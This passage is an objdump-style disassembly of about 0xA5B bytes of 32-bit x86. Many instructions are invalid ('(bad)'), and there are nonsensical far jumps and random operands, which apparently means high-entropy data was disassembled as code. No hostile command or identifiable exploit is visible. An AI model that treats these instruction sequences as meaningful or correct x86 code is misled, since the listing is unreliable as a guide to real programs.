  427639:	cmp    BYTE PTR [esp+esi*2],cl
  42763c:	push   esi
  42763d:	inc    ebp
  42763e:	jge    0x4275c1
  427640:	(bad)  
  427642:	pusha  
  427643:	js     0x42766d
  427645:	adc    DWORD PTR [eax+0xa29ca11],esp
  42764b:	lods   al,BYTE PTR ds:[esi]
  42764c:	jno    0x427608
  42764e:	pop    edx
  42764f:	(bad)  
  427650:	rol    BYTE PTR [ebp-0x373c000d],1
  427656:	test   eax,0x4598e8d5
  42765b:	xchg   edi,eax
  42765c:	retf   
  42765d:	jmp    0x95962f25
  427662:	mov    eax,ds:0xee756ef8
  427667:	imul   edx,DWORD PTR [ebx],0xffffffdd
  42766a:	jae    0x427629
  42766c:	xor    ecx,DWORD PTR [ebx-0x12]
  42766f:	int3   
  427670:	fcom   DWORD PTR [eax]
  427672:	lds    ebx,FWORD PTR [ebx+esi*2]
  427675:	fwait
  427676:	pop    es
  427677:	sti    
  427678:	push   0xffffffa3
  42767a:	xor    ebx,esi
  42767c:	mov    dl,0xb4
  42767e:	sub    al,0x25
  427680:	mov    dl,0xa0
  427682:	or     BYTE PTR [edi-0x6b],0x27
  427686:	jns    0x4276b4
  427688:	mov    WORD PTR [esi-0x5f],fs
  42768b:	cdq    
  42768c:	mov    ds:0x191ddbcd,al
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	(bad)  
  427701:	(bad)  
  427702:	(bad)  
  427703:	mov    ebp,esp
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0x77000001
  42770d:	and    edi,ecx
  42770f:	retf   0x32d4
  427712:	stos   DWORD PTR es:[edi],eax
  427713:	popa   
  427714:	stos   DWORD PTR es:[edi],eax
  427715:	pop    esi
  427716:	dec    eax
  427717:	sbb    ecx,DWORD PTR [edi]
  427719:	jns    0x427732
  42771b:	fcomp  QWORD PTR [ecx]
  42771d:	and    esp,edi
  42771f:	xchg   esp,eax
  427720:	jbe    0x42772d
  427722:	repnz outs dx,BYTE PTR ds:[esi]
  427724:	xchg   ebp,eax
  427725:	loop   0x427789
  427727:	mov    gs,esp
  427729:	stos   BYTE PTR es:[edi],al
  42772a:	mov    edx,0x8ab5ce81
  42772f:	sub    dx,WORD PTR [edx]
  427732:	fnstenv [esi]
  427734:	pop    edx
  427735:	add    al,0x56
  427737:	stos   BYTE PTR es:[edi],al
  427738:	out    0x3c,eax
  42773a:	mov    ?,esp
  42773c:	shr    DWORD PTR [ebx+0x55],cl
  42773f:	jg     0x4277c0
  427741:	scas   al,BYTE PTR es:[edi]
  427742:	lea    ebp,[edx+0x78]
  427745:	arpl   WORD PTR [ecx+ebx*2-0x40dd97e7],ax
  42774c:	sbb    eax,0x216d52d6
  427751:	daa    
  427752:	or     ebx,DWORD PTR [edi+0x7a]
  427755:	cwde   
  427756:	imul   esp,DWORD PTR [edi-0xd15a3b0],0x35
  42775d:	fild   DWORD PTR [eax-0x72f44f5a]
  427763:	and    al,0xf0
  427765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427766:	sub    DWORD PTR [edx-0x79],ecx
  427769:	sbb    ah,al
  42776b:	dec    edx
  42776c:	jecxz  0x4276fc
  42776e:	jns    0x42774b
  427770:	enter  0x7c14,0xf1
  427774:	jmp    0xebe770a5
  427779:	ret    0xc508
  42777c:	pop    esi
  42777d:	outs   dx,DWORD PTR ds:[esi]
  42777e:	cmp    BYTE PTR [edx-0x5f75bb48],dh
  427784:	dec    edi
  427785:	inc    esp
  427786:	test   eax,0x14f093f8
  42778b:	cmp    esi,eax
  42778d:	push   es
  42778e:	test   eax,0x607599ad
  427793:	add    al,0xc
  427795:	popf   
  427796:	out    dx,eax
  427797:	shl    BYTE PTR [ecx],1
  427799:	nop
  42779a:	push   es
  42779b:	repnz dec ebx
  42779d:	aam    0xbe
  42779f:	loope  0x42773f
  4277a1:	mov    eax,ds:0x9a75ad5
  4277a6:	xor    eax,0xf7d21995
  4277ab:	xchg   ecx,eax
  4277ac:	stc    
  4277ad:	pop    ecx
  4277ae:	xchg   esi,eax
  4277af:	inc    edx
  4277b0:	pusha  
  4277b1:	jno    0x42775f
  4277b3:	fnstcw WORD PTR [esi+ebp*4+0x2b]
  4277b7:	ss mov ebp,0x4b7924b1
  4277bd:	sbb    eax,ecx
  4277bf:	arpl   WORD PTR [ebp-0x49],si
  4277c2:	xchg   ebx,eax
  4277c3:	sbb    esp,DWORD PTR [ebp-0x65e0ca3]
  4277c9:	into   
  4277ca:	xchg   esp,eax
  4277cb:	bnd ja 0x4277eb
  4277ce:	xor    al,0xae
  4277d0:	fs cs mov bh,0x8b
  4277d4:	out    dx,al
  4277d5:	in     eax,dx
  4277d6:	xor    ah,BYTE PTR [ebp+0x60]
  4277d9:	call   0x96fd:0xb4a8e80e
  4277e0:	xchg   esi,esp
  4277e2:	or     eax,0x53f9fa99
  4277e7:	xchg   ebp,eax
  4277e8:	xchg   edi,eax
  4277e9:	mov    dl,0x79
  4277eb:	mov    edi,DWORD PTR [esi+ecx*8]
  4277ee:	lods   eax,DWORD PTR ds:[esi]
  4277ef:	shl    DWORD PTR [esi],1
  4277f1:	mov    dl,0xe4
  4277f3:	inc    ebp
  4277f4:	(bad)  
  4277f5:	stos   BYTE PTR es:[edi],al
  4277f6:	je     0x4277d0
  4277f8:	or     DWORD PTR [ebx-0x36],ecx
  4277fb:	fisttp WORD PTR [edx]
  4277fd:	arpl   WORD PTR [edi+0x70bd3d6e],bp
  427803:	nop
  427804:	cmp    dh,bh
  427806:	pop    ebp
  427807:	or     ebp,DWORD PTR [eax+0x2bcaf1c2]
  42780d:	pop    ss
  42780e:	add    eax,0xaa0a
	...
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	xor    al,0x5
  427882:	loop   0x42780b
  427884:	icebp  
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0x90000001
  42788d:	jae    0x42785a
  42788f:	push   esp
  427890:	call   0x1bebe7c5
  427895:	or     eax,0xf3f801fb
  42789a:	xchg   esi,eax
  42789b:	repnz push ss
  42789d:	sbb    BYTE PTR [edi],al
  42789f:	pop    ds
  4278a0:	popa   
  4278a1:	ins    BYTE PTR es:[edi],dx
  4278a2:	aaa    
  4278a3:	mov    ecx,0x1842ffa1
  4278a8:	mov    dh,0xa
  4278aa:	xor    BYTE PTR [edx],0x41
  4278ad:	(bad)  
  4278ae:	xchg   esp,eax
  4278af:	cld    
  4278b0:	hlt    
  4278b1:	push   0x31c992f
  4278b6:	lds    ecx,FWORD PTR [eax]
  4278b8:	mov    eax,ds:0x44648ab2
  4278bd:	mov    eax,0xa79df4a2
  4278c2:	and    BYTE PTR [eax+ecx*1],dh
  4278c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278c6:	lahf   
  4278c7:	(bad)  
  4278c9:	(bad)  
  4278ca:	(bad)  [ecx+ebx*2-0x5d]
  4278ce:	adc    ebp,ebp
  4278d0:	jno    0x4278b2
  4278d2:	xlat   BYTE PTR ds:[ebx]
  4278d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278d4:	fucomp st(6)
  4278d6:	lds    eax,FWORD PTR [ebx-0x39edd8da]
  4278dc:	mov    al,0x94
  4278de:	das    
  4278df:	sbb    BYTE PTR [edx],bl
  4278e1:	pusha  
  4278e2:	and    al,0x8b
  4278e4:	cli    
  4278e5:	mov    bl,0x80
  4278e7:	inc    edi
  4278e8:	mul    BYTE PTR [esi]
  4278ea:	jb     0x4278f7
  4278ec:	retf   
  4278ed:	(bad)  
  4278ee:	sub    al,0x3
  4278f0:	inc    ecx
  4278f1:	push   esp
  4278f2:	xor    eax,0x7fd1f1b1
  4278f7:	lock fstp TBYTE PTR [eax-0x3e]
  4278fb:	cdq    
  4278fc:	cmp    BYTE PTR [ebp-0x4de0907c],bh
  427902:	stos   BYTE PTR es:[edi],al
  427903:	push   ss
  427904:	(bad)  
  427905:	and    al,0x51
  427907:	mov    esi,DWORD PTR [eax]
  427909:	scas   eax,DWORD PTR es:[edi]
  42790a:	or     dh,BYTE PTR [esi+0x1c]
  42790d:	add    BYTE PTR [ebp-0x29439277],0x41
  427914:	mov    eax,ds:0x7b87f161
  427919:	add    al,0x3
  42791b:	adc    edi,DWORD PTR [eax]
  42791d:	lock and al,0xff
  427920:	adc    DWORD PTR [edi-0x69db7383],edi
  427926:	pop    eax
  427927:	imul   BYTE PTR [edx-0x31]
  42792a:	sub    BYTE PTR [ebp-0x794969e8],ch
  427930:	jmp    0xfaae:0x813f5988
  427937:	mov    cl,0x3c
  427939:	add    BYTE PTR [ebx-0x5e],dl
  42793c:	in     eax,0x89
  42793e:	mov    dh,0x9a
  427940:	adc    al,0x6a
  427942:	jg     0x4279c3
  427944:	nop
  427945:	iret   
  427946:	sub    al,0xef
  427948:	cmp    cl,0x2c
  42794b:	pop    ecx
  42794c:	lods   al,BYTE PTR cs:[esi]
  42794e:	or     al,0xf1
  427950:	xor    eax,0xc69fb9fa
  427955:	cmp    esp,esi
  427957:	arpl   WORD PTR [eax-0x7c93d726],dx
  42795d:	je     0x4278fc
  42795f:	xor    al,0x58
  427961:	leave  
  427962:	jle    0x42796b
  427964:	js     0x4279e5
  427966:	mov    BYTE PTR [ecx+0x10e5bb1a],dl
  42796c:	pop    ebp
  42796d:	test   BYTE PTR [edx],dl
  42796f:	ja     0x4279b1
  427971:	sub    DWORD PTR [edi+0x142c2581],esi
  427977:	jl     0x4279a8
  427979:	mov    BYTE PTR [ebx+0x594847b],ch
  42797f:	call   0xdb3b:0x3db51be5
  427986:	je     0x4279bc
  427988:	pop    esi
  427989:	mov    BYTE PTR [edi+0x7afe970a],dh
  42798f:	hlt    
  427990:	sub    al,BYTE PTR [eax]
	...
  4279f2:	add    BYTE PTR [eax],al
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	cmp    esi,0xffffffde
  427a02:	mov    bh,0xbb
  427a04:	mul    BYTE PTR [edi+0x1050001]
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	push   esp
  427a0d:	jecxz  0x427a81
  427a0f:	jo     0x427a01
  427a11:	sub    DWORD PTR [ebp-0x38],ebp
  427a14:	push   ecx
  427a15:	jecxz  0x427a18
  427a17:	sub    BYTE PTR [eax],ch
  427a19:	std    
  427a1a:	add    DWORD PTR [esi+0x69adbe85],ebx
  427a20:	mov    eax,0x4e034c59
  427a25:	in     eax,0x4e
  427a27:	pop    edi
  427a28:	fxch   st(7)
  427a2a:	fild   WORD PTR [ecx-0x4c]
  427a2d:	shl    DWORD PTR [ecx+ebp*1-0x15d20ac1],cl
  427a34:	jnp    0x427a5e
  427a36:	fimul  DWORD PTR [edi+0x0]
  427a39:	sahf   
  427a3a:	cmp    esp,ebx
  427a3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a3d:	aad    0x28
  427a3f:	int3   
  427a40:	inc    esi
  427a41:	xchg   ebx,eax
  427a42:	cmp    al,0xb2
  427a44:	mov    al,0x63
  427a46:	jo     0x427a36
  427a48:	repnz mov DWORD PTR [ecx+0x13],0xd7e7990a
  427a50:	push   esp
  427a51:	(bad)  
  427a52:	mov    ebp,DWORD PTR [eax]
  427a54:	call   FWORD PTR [edi+0x1f543b04]
  427a5a:	and    DWORD PTR [esi+0x4ad579ce],eax
  427a60:	dec    eax
  427a61:	or     DWORD PTR [edx+esi*4],eax
  427a64:	xor    al,0x2d
  427a66:	mov    DWORD PTR [ebp-0x52],eax
  427a69:	mov    ah,0xdc
  427a6b:	sub    eax,DWORD PTR [ebp-0x28]
  427a6e:	int    0x5e
  427a70:	test   al,0xbc
  427a72:	mov    DWORD PTR [esp+ecx*4+0x7e52e5e5],edx
  427a79:	xchg   ecx,eax
  427a7a:	or     bh,dl
  427a7c:	lods   al,BYTE PTR ds:[esi]
  427a7d:	gs pop ebp
  427a7f:	mov    ?,WORD PTR ds:0x9ebfead9
  427a85:	nop
  427a86:	cdq    
  427a87:	mov    al,ds:0x956dec86
  427a8c:	push   ebp
  427a8d:	push   esp
  427a8e:	jb     0x427aeb
  427a90:	jmp    0xb622:0xcc79c6ce
  427a97:	rol    BYTE PTR [ebp-0x2f],0xf3
  427a9b:	pop    ebx
  427a9c:	mov    edi,0xd63a4dd3
  427aa1:	ret    0xeaeb
  427aa4:	addr16 pop ss
  427aa6:	test   DWORD PTR [eax-0x381d70fe],0xddb7b5c8
  427ab0:	pushf  
  427ab1:	(bad)  
  427ab2:	xchg   esp,eax
  427ab3:	mov    ss,WORD PTR [edi]
  427ab5:	cli    
  427ab6:	jmp    FWORD PTR [esi-0x32]
  427ab9:	js     0x427ac3
  427abb:	jnp    0x427a99
  427abd:	ja     0x427a95
  427abf:	clc    
  427ac0:	mov    ah,0x61
  427ac2:	sbb    eax,0x663319a9
  427ac7:	push   cs
  427ac8:	lea    ecx,[edi+0x6d]
  427acb:	mov    edi,0xad10407c
  427ad0:	ret    
  427ad1:	and    ah,BYTE PTR [ebp+0x63]
  427ad4:	mov    esp,0x80cf2394
  427ad9:	(bad)  
  427ada:	out    dx,al
  427adb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427adc:	jmp    0x2c0fafb5
  427ae1:	cdq    
  427ae2:	cwde   
  427ae3:	test   BYTE PTR [eax-0x424d979b],bh
  427ae9:	inc    eax
  427aea:	xor    ch,BYTE PTR [edx-0x56]
  427aed:	fild   QWORD PTR [edx+0x4f0cd682]
  427af3:	dec    ebp
  427af4:	ss and eax,0xc47fc1e3
  427afa:	jle    0x427b14
  427afc:	into   
  427afd:	sti    
  427afe:	clc    
  427aff:	je     0x427aee
  427b01:	loopne 0x427a92
  427b03:	test   DWORD PTR [esi],edx
  427b05:	hlt    
  427b06:	mov    ecx,0x9b10b32d
  427b0b:	jmp    0xbc:0xa312bc81
	...
  427b72:	add    BYTE PTR [eax],al
  427b74:	retf   0x528b
  427b77:	jnp    0x427bcc
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	test   BYTE PTR [edi],0x42
  427b82:	pop    edi
  427b83:	(bad)  
  427b84:	sti    
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR ds:0x8b000001,al
  427b8d:	xchg   DWORD PTR [eax],esp
  427b8f:	dec    edi
  427b90:	test   al,0xb5
  427b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b93:	xlat   BYTE PTR ds:[ebx]
  427b94:	inc    BYTE PTR [ebx+esi*4+0x41054df5]
  427b9b:	rcl    DWORD PTR [edx+0x3f],cl
  427b9e:	xchg   esp,eax
  427b9f:	test   dh,0x1e
  427ba2:	pop    ebx
  427ba3:	in     al,0x42
  427ba5:	and    DWORD PTR [eax-0x6456d9e5],eax
  427bab:	outs   dx,BYTE PTR ds:[esi]
  427bac:	fdivr  DWORD PTR [ebp+0x23]
  427baf:	ss ins DWORD PTR es:[edi],dx
  427bb1:	ret    
  427bb2:	inc    esp
  427bb3:	out    0xcd,al
  427bb5:	ss jg  0x427b50
  427bb8:	sbb    eax,0x5adc1495
  427bbd:	or     DWORD PTR [ebx],0x5a9991f0
  427bc3:	(bad)  
  427bc4:	cli    
  427bc5:	or     esi,DWORD PTR [ebx]
  427bc7:	mov    al,ds:0xade9ec47
  427bcc:	loope  0x427bf5
  427bce:	ins    BYTE PTR es:[edi],dx
  427bcf:	push   ebp
  427bd0:	mov    edx,0xfa3118f4
  427bd5:	mov    BYTE PTR [ebp-0x6ad5b48b],cl
  427bdb:	addr16 fcomip st,st(0)
  427bde:	out    dx,al
  427bdf:	lods   eax,DWORD PTR ds:[esi]
  427be0:	leave  
  427be1:	mov    eax,ds:0x5b2e62a7
  427be6:	push   esp
  427be7:	sbb    eax,0x772261b8
  427bec:	xchg   DWORD PTR [eax+0x53],ecx
  427bef:	add    al,0xb2
  427bf1:	int3   
  427bf2:	rcl    BYTE PTR [ebp+0x3dad198b],0x71
  427bf9:	fdecstp 
  427bfb:	rcr    bl,0x98
  427bfe:	fnstsw WORD PTR [edi-0xf609f4]
  427c04:	add    al,0xdf
  427c06:	sbb    ah,BYTE PTR [ebx+eax*4+0x56]
  427c0a:	jmp    0xccb7b4d3
  427c0f:	and    BYTE PTR [eax-0x6f9ce25],dh
  427c15:	mov    cl,0x84
  427c17:	dec    ecx
  427c18:	mov    ebp,0xde1951ff
  427c1d:	and    al,0xe5
  427c1f:	call   0x8c27:0x1cd387b0
  427c26:	mov    es,WORD PTR [edx-0x38c90000]
  427c2c:	xchg   ebp,eax
  427c2d:	je     0x427bd6
  427c2f:	cmp    eax,0x6df2b890
  427c34:	pop    ebp
  427c35:	pop    eax
  427c36:	cmp    DWORD PTR [eax+0x3daf2f4d],esp
  427c3c:	std    
  427c3d:	sbb    al,0x87
  427c3f:	and    DWORD PTR [eax+0xe],edx
  427c42:	jp     0x427c64
  427c44:	mov    ebx,0x57c00ebc
  427c49:	and    ecx,edi
  427c4b:	into   
  427c4c:	mov    ebx,0x49eec736
  427c51:	jne    0x427c52
  427c53:	fnstcw WORD PTR [esi]
  427c55:	and    eax,DWORD PTR [edi-0x5de126d8]
  427c5b:	sbb    eax,0xfb1be2f7
  427c60:	(bad)  
  427c61:	shr    BYTE PTR [ecx+0x14bf2a],cl
  427c67:	mov    ebx,0xc2bbafc1
  427c6c:	pop    es
  427c6d:	xchg   ebp,eax
  427c6e:	imul   ecx,DWORD PTR [eax],0x42
  427c71:	jno    0x427c00
  427c73:	inc    ecx
  427c74:	fcomp  QWORD PTR [ebp-0x21f0e23]
  427c7a:	mov    ebx,0xff72a0ac
  427c7f:	or     BYTE PTR [ecx],cl
  427c81:	stc    
  427c82:	sub    eax,esi
  427c84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c85:	cmp    ch,BYTE PTR [edi+0xa]
  427c88:	and    eax,0x10bc0f62
  427c8d:	cmp    DWORD PTR ds:0x82b6,0x0
	...
  427cf3:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0xc79b5d44,ebx
  427d02:	cmp    al,0xf1
  427d04:	add    BYTE PTR [edx+0x1050001],ch
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	push   ebx
  427d0d:	mov    al,ds:0xc3d7eb3
  427d12:	inc    ecx
  427d13:	adc    al,0x6
  427d15:	pop    ds
  427d16:	inc    edx
  427d17:	mov    ss,esi
  427d19:	push   ecx
  427d1a:	jnp    0x427cc8
  427d1c:	rcl    DWORD PTR [eax-0x77e4848f],cl
  427d22:	mov    esp,0xff947cff
  427d27:	or     al,0xe4
  427d29:	xlat   BYTE PTR ds:[ebx]
  427d2a:	cwde   
  427d2b:	pop    eax
  427d2c:	scas   al,BYTE PTR es:[edi]
  427d2d:	push   ss
  427d2e:	imul   ebp,DWORD PTR [ecx+0x19],0x73
  427d32:	sbb    al,0xbb
  427d34:	rcr    ah,cl
  427d36:	push   ebp
  427d37:	mov    esp,DWORD PTR ds:0xc97d28b1
  427d3d:	mov    esi,0x67aa14be
  427d42:	and    al,bh
  427d44:	mov    edi,0xe85384
  427d49:	shl    BYTE PTR [ebp-0x3887443c],cl
  427d4f:	push   0xd
  427d51:	cli    
  427d52:	enter  0xca38,0xbc
  427d56:	test   al,0x1a
  427d58:	mov    dh,0xda
  427d5a:	nop
  427d5b:	and    ecx,ebx
  427d5d:	int3   
  427d5e:	enter  0x7e87,0xf7
  427d62:	mov    bh,0xc8
  427d64:	xor    DWORD PTR [edi+0x7d],esp
  427d67:	lds    esi,FWORD PTR fs:[eax]
  427d6a:	inc    esp
  427d6b:	pop    eax
  427d6c:	dec    ebx
  427d6d:	std    
  427d6e:	adc    eax,0x5f7a11b7
  427d73:	scas   eax,DWORD PTR es:[edi]
  427d74:	add    eax,DWORD PTR [edi+0x35153441]
  427d7a:	push   esp
  427d7b:	xchg   edi,eax
  427d7c:	mov    bh,0x24
  427d7e:	(bad)  
  427d7f:	sar    DWORD PTR [ebx],1
  427d81:	push   cs
  427d82:	aaa    
  427d83:	dec    edi
  427d84:	rcr    BYTE PTR [edx],1
  427d86:	sahf   
  427d87:	out    0x48,al
  427d89:	xchg   ebx,eax
  427d8a:	cmp    DWORD PTR [ecx+0x8],ebx
  427d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d8e:	fstp   QWORD PTR [edx-0x11]
  427d91:	inc    edi
  427d92:	mov    bl,0x41
  427d94:	inc    esp
  427d95:	add    ch,BYTE PTR [ebp+0x26fd2f54]
  427d9b:	push   0xffffffea
  427d9d:	outs   dx,DWORD PTR ds:[esi]
  427d9e:	dec    edx
  427d9f:	push   ebx
  427da0:	ins    BYTE PTR es:[edi],dx
  427da1:	fidivr DWORD PTR [ebp+0x323bdd0a]
  427da7:	mov    ah,0x86
  427da9:	cwde   
  427daa:	stc    
  427dab:	scas   al,BYTE PTR es:[edi]
  427dac:	or     ch,cl
  427dae:	inc    ecx
  427daf:	mov    bl,0x22
  427db1:	outs   dx,DWORD PTR ds:[esi]
  427db2:	jne    0x427dff
  427db4:	mov    WORD PTR [edi-0x2c9d940e],es
  427dba:	ficomp DWORD PTR [esi-0x2c]
  427dbd:	xchg   esi,eax
  427dbe:	stos   BYTE PTR es:[edi],al
  427dbf:	or     ecx,DWORD PTR [edx]
  427dc1:	sar    dh,1
  427dc3:	pop    ss
  427dc4:	arpl   WORD PTR [ecx-0x3a],sp
  427dc7:	mov    ds:0x63e6918b,eax
  427dcc:	or     BYTE PTR [ebx+0x71],0x13
  427dd0:	es ins BYTE PTR es:[edi],dx
  427dd2:	sbb    BYTE PTR [ecx+ecx*8+0x4e63c941],0xa7
  427dda:	mov    edi,eax
  427ddc:	test   DWORD PTR ss:[ecx+edi*2],0xa4595804
  427de4:	loop   0x427d7d
  427de6:	push   0xffffff89
  427de8:	sar    BYTE PTR [bp+si],0x8c
  427dec:	push   eax
  427ded:	fdivr  QWORD PTR [ebx]
  427def:	jns    0x427deb
  427df1:	sbb    eax,0x158dcab4
  427df6:	mov    ebx,0x834a6d09
  427dfb:	call   0x64f0:0x26894305
  427e02:	mov    ecx,0xaf2a5555
  427e07:	add    ah,BYTE PTR [edi]
  427e09:	or     eax,0xb25a7e5f
  427e0e:	out    dx,al
  427e0f:	mov    dh,0xe5
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	cli    
  427e81:	mov    ch,0xce
  427e83:	aas    
  427e84:	add    eax,0x50001ab
  427e89:	add    DWORD PTR [eax],eax
  427e8b:	add    ch,bl
  427e8d:	mov    edi,0x70080a2b
  427e92:	(bad)  
  427e93:	out    dx,al
  427e94:	jae    0x427ec5
  427e96:	jno    0x427e43
  427e98:	ins    DWORD PTR es:[edi],dx
  427e99:	jecxz  0x427e84
  427e9b:	fist   WORD PTR [ebp-0x1b]
  427e9e:	inc    ecx
  427e9f:	popa   
  427ea0:	fsubr  QWORD PTR [edi+0x74d83cb3]
  427ea6:	jno    0x427e66
  427ea8:	(bad)  
  427ea9:	mov    dl,BYTE PTR [ecx+0x1f]
  427eac:	das    
  427ead:	test   BYTE PTR [esi],ah
  427eaf:	fistp  DWORD PTR [eax-0x26]
  427eb2:	mov    dh,0xe7
  427eb4:	xlat   BYTE PTR ds:[ebx]
  427eb5:	daa    
  427eb6:	ror    BYTE PTR [edi],1
  427eb8:	iret   
  427eb9:	test   DWORD PTR [ebx+0x4f],0xefdeaaa2
  427ec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ec1:	div    al
  427ec3:	call   0x5ba:0xae0575d2
  427eca:	inc    edx
  427ecb:	adc    DWORD PTR [ebp+0x2bc2c5d7],ebp
  427ed1:	push   cs
  427ed2:	loopne 0x427e7b
  427ed4:	mul    BYTE PTR [ebx]
  427ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ed7:	cli    
  427ed8:	repnz cmp DWORD PTR [edx+0x26d862e1],ebp
  427edf:	loope  0x427ec8
  427ee1:	jno    0x427f4f
  427ee3:	or     bl,BYTE PTR [ebx]
  427ee5:	repnz add BYTE PTR [ecx-0x50de8573],0xfb
  427eed:	adc    esi,DWORD PTR [edi+0x1b3670c3]
  427ef3:	arpl   WORD PTR [edx],dx
  427ef5:	jge    0x427ed3
  427ef7:	xchg   ecx,eax
  427ef8:	cld    
  427ef9:	nop
  427efa:	or     DWORD PTR ds:0x12e7b46e,edx
  427f00:	jecxz  0x427f28
  427f02:	out    dx,al
  427f03:	out    0xc8,eax
  427f05:	sar    BYTE PTR [esi-0x38],0xb3
  427f09:	mov    dl,0x75
  427f0b:	cwde   
  427f0c:	mov    eax,0x810d80bb
  427f11:	shr    ah,0xe7
  427f14:	pop    edi
  427f15:	js     0x427f26
  427f17:	mov    ebx,0x32d29086
  427f1c:	fadd   st,st(4)
  427f1e:	adc    ebx,DWORD PTR [edi+0x2fcaed8f]
  427f24:	dec    ebp
  427f25:	ja     0x427f2e
  427f27:	xchg   ch,dh
  427f29:	jne    0x427f4b
  427f2b:	(bad)  
  427f2c:	icebp  
  427f2d:	das    
  427f2e:	fimul  DWORD PTR [esi-0x1a]
  427f31:	sub    eax,0x8bdee655
  427f36:	inc    ecx
  427f37:	cmc    
  427f38:	sbb    eax,0xbb946c02
  427f3d:	push   edi
  427f3e:	popf   
  427f3f:	xchg   esi,eax
  427f40:	cmp    DWORD PTR [edx-0x11],0xa54e1349
  427f47:	jp     0x427f1f
  427f49:	and    cl,bl
  427f4b:	sbb    al,0xc1
  427f4d:	test   eax,0x6b4eb589
  427f52:	xor    esp,DWORD PTR [eax-0x532e6bc4]
  427f58:	xchg   esi,eax
  427f59:	and    eax,0x639a409b
  427f5e:	jle    0x427f66
  427f60:	mov    ebp,0x20f31c59
  427f65:	sbb    BYTE PTR [eax+0x16],dl
  427f68:	mov    dl,0x76
  427f6a:	call   DWORD PTR [ebp-0x58]
  427f6d:	in     eax,0x6d
  427f6f:	inc    edi
  427f70:	dec    ebx
  427f71:	sbb    esp,DWORD PTR gs:[esi]
  427f74:	jae    0x427f17
  427f76:	mov    ebp,0x4ca6d83
  427f7b:	(bad)  
  427f7c:	cmp    al,BYTE PTR [ecx+0x315830fe]
  427f82:	or     dl,dl
  427f84:	sahf   
  427f85:	cli    
  427f86:	js     0x427f5a
  427f88:	jno    0x427fc9
  427f8a:	loop   0x427fb9
  427f8c:	add    eax,0xbd527011
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	jg     0x428068
  428002:	fs jo  0x42800f
  428005:	lods   al,BYTE PTR ds:[esi]
  428006:	add    DWORD PTR [eax],eax
  428008:	add    eax,0x89000001
  42800d:	imul   esi,eax,0xe8c604bb
  428013:	retf   
  428014:	xchg   edi,eax
  428015:	adc    bh,cl
  428017:	ss dec esi
  428019:	and    DWORD PTR [ebp+0x7c9b64f0],0x21e97eb5
  428023:	pop    edi
  428024:	iret   
  428025:	(bad)  
  428026:	loope  0x427fde
  428028:	call   0xa590e657
  42802d:	addr16 mov dh,0x78
  428030:	jle    0x427fc8
  428032:	jnp    0x427fd4
  428034:	stos   DWORD PTR es:[edi],eax
  428035:	scas   eax,DWORD PTR es:[edi]
  428036:	dec    esp
  428037:	call   0x783ea852
  42803c:	pusha  
  42803d:	les    eax,FWORD PTR [ebx*8-0xb5ce7d2]
  428044:	lea    esi,[edx]
  428046:	cdq    
  428047:	mov    DWORD PTR [edi],esi
  428049:	pop    esp
  42804a:	cmp    DWORD PTR [ebp+0x4e],0xd466a766
  428051:	rol    BYTE PTR [eax],1
  428053:	mov    cl,0xad
  428055:	mov    esi,DWORD PTR [ebx+0x2ca3509a]
  42805b:	repz mov cl,0x58
  42805e:	dec    edi
  42805f:	xchg   ebx,eax
  428060:	aad    0x2c
  428062:	xor    edi,DWORD PTR [edi]
  428064:	cmp    DWORD PTR [ebp+ecx*4-0x67],edx
  428068:	pushf  
  428069:	aam    0x9e
  42806b:	(bad)  
  42806c:	fild   QWORD PTR [esi]
  42806e:	mov    bh,BYTE PTR [esi]
  428070:	or     al,0x66
  428072:	dec    eax
  428073:	jle    0x42805f
  428075:	mov    ds:0xff020ea6,eax
  42807a:	xchg   ecx,eax
  42807b:	pop    esp
  42807c:	fisttp WORD PTR [edi-0x52]
  42807f:	iret   
  428080:	add    BYTE PTR [ebx],ah
  428082:	fsubr  QWORD PTR [edi+0x3b]
  428085:	mov    ds:0x1ddaa557,al
  42808a:	int    0xd3
  42808c:	xchg   esp,eax
  42808d:	adc    eax,0xbecfe371
  428092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428093:	ins    BYTE PTR es:[edi],dx
  428094:	jmp    0x4e85:0x78d9f36
